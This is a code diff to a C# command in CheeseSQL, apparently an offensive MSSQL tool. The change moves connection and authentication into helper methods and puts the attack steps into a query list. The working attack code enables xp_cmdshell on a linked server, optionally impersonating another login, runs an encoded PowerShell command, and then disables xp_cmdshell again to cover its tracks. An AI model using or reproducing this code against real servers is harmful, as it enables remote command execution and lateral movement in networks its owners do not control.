@@ -1,4 +1,5 @@
-﻿using System;
+﻿using CheeseSQL.Helpers;
+using System;
 using System.Collections.Generic;
 using System.Data.SqlClient;
 
@@ -30,9 +31,6 @@ namespace CheeseSQL.Commands
 
         public void Execute(Dictionary<string, string> arguments)
         {
-
-            string user = "";
-            string password = "";
             string connectInfo = "";
             string database = "";
             string connectserver = "";
@@ -94,114 +92,29 @@ namespace CheeseSQL.Commands
                 return;
             }
 
-            if (sqlauth)
+            SqlConnection connection;
+            SQLExecutor.ConnectionInfo(arguments, connectserver, database, sqlauth, out connectInfo);
+            if (String.IsNullOrEmpty(connectInfo))
             {
-                if (arguments.ContainsKey("/user"))
-                {
-                    user = arguments["/user"];
-                }
-                if (arguments.ContainsKey("/password"))
-                {
-                    password = arguments["/password"];
-                }
-                if (String.IsNullOrEmpty(user))
-                {
-                    Console.WriteLine("\r\n[X] You must supply the SQL account user!\r\n");
-                    return;
-                }
-                if (String.IsNullOrEmpty(password))
-                {
-                    Console.WriteLine("\r\n[X] You must supply the SQL account password!\r\n");
-                    return;
-                }
-                connectInfo = "Data Source= " + connectserver + "; Initial Catalog= " + database + "; User ID=" + user + "; Password=" + password;
+                return;
             }
-            else
+            if (!SQLExecutor.Authenticate(connectInfo, out connection))
             {
-                connectInfo = "Server = " + connectserver + "; Database = " + database + "; Integrated Security = True;";
-            }
-
-            SqlConnection connection = new SqlConnection(connectInfo);
-
-            try
-            {
-                connection.Open();
-                Console.WriteLine($"[+] Authentication to the '{database}' Database on '{connectserver}' Successful!");
-            }
-            catch
-            {
-                Console.WriteLine($"[-] Authentication to the '{database}' Database on '{connectserver}' Failed.");
                 return;
             }
 
-            string enableAdvOptions = $"SELECT 1 FROM OPENQUERY(\"{target}\", 'SELECT 1; EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;')";
-            if (!String.IsNullOrEmpty(impersonate_linked))
+            var queries = new List<string>();
+
+            queries.Add("SELECT 1 as 'Enabling Advanced Options'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;");
+            queries.Add("SELECT 1 as 'Enabling xp_cmdshell'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
+            queries.Add($"SELECT 1 as 'Executing command'; EXEC xp_cmdshell 'powershell -enc {cmd}';");
+            queries.Add("SELECT 1 as 'Disabling xp_cmdshell'; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;");
+            queries.Add("SELECT 1 as 'Disabling Advanced Options'; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;");
+
+            foreach (string query in queries)
             {
-                enableAdvOptions = $"SELECT 1 FROM OPENQUERY(\"{target}\", 'EXECUTE AS LOGIN = ''{impersonate_linked}'' SELECT 1; EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;')";
+                SQLExecutor.ExecuteLinkedQuery(connection, query, target, impersonate, impersonate_linked);
             }
-
-
-            if (!String.IsNullOrEmpty(impersonate))
-            {
-                enableAdvOptions = $"EXECUTE AS LOGIN = '{impersonate}' {enableAdvOptions}";
-            }
-
-            SqlCommand command = new SqlCommand(enableAdvOptions, connection);
-            SqlDataReader reader = command.ExecuteReader();
-            reader.Read();
-            Console.WriteLine("[*] Enabling Advanced options..");
-            reader.Close();
-
-            string enableXP = $"SELECT 1 FROM OPENQUERY(\"{target}\", 'SELECT 1; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;')";
-            if (!String.IsNullOrEmpty(impersonate_linked))
-            {
-                enableXP = $"SELECT 1 FROM OPENQUERY(\"{target}\", 'EXECUTE AS LOGIN = ''{impersonate_linked}'' SELECT 1; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;')";
-            }
-
-
-            if (!String.IsNullOrEmpty(impersonate))
-            {
-                enableXP = $"EXECUTE AS LOGIN = '{impersonate}' {enableXP}";
-            }
-            command = new SqlCommand(enableXP, connection);
-            reader = command.ExecuteReader();
-            reader.Read();
-            Console.WriteLine("[*] Enabling xp_cmdshell..");
-            reader.Close();
-
-            string execCmd = $"SELECT 1 FROM OPENQUERY(\"{target}\", 'SELECT 1; EXEC xp_cmdshell ''powershell -enc {cmd}'';')";
-            if (!String.IsNullOrEmpty(impersonate_linked))
-            {
-                execCmd = $"SELECT 1 FROM OPENQUERY(\"{target}\", 'EXECUTE AS LOGIN = ''{impersonate_linked}'' SELECT 1; EXEC xp_cmdshell ''powershell -enc {cmd}'';')";
-            }
-
-            if (!String.IsNullOrEmpty(impersonate))
-            {
-                execCmd = $"EXECUTE AS LOGIN = '{impersonate}' {execCmd}";
-            }
-            command = new SqlCommand(execCmd, connection);
-            reader = command.ExecuteReader();
-            reader.Read();
-            Console.WriteLine("[*] Executing command..");
-            Console.WriteLine("[+] Command result: " + reader[0]);
-            reader.Close();
-
-            string disableXP = $"SELECT 1 FROM OPENQUERY(\"{target}\", 'SELECT 1; EXEC sp_configure ''xp_cmdshell'', 0; RECONFIGURE;')";
-            if (!String.IsNullOrEmpty(impersonate_linked))
-            {
-                disableXP = $"SELECT 1 FROM OPENQUERY(\"{target}\", 'EXECUTE AS LOGIN = ''{impersonate_linked}'' SELECT 1; EXEC sp_configure ''xp_cmdshell'', 0; RECONFIGURE;'';')";
-            }
-
-            if (!String.IsNullOrEmpty(impersonate))
-            {
-                disableXP = $"EXECUTE AS LOGIN = '{impersonate}' {disableXP}";
-            }
-
-            command = new SqlCommand(disableXP, connection);
-            reader = command.ExecuteReader();
-            reader.Read();
-            Console.WriteLine("[*] Disabling xp_cmdshell..");
-            reader.Close();
 
             connection.Close();
         }
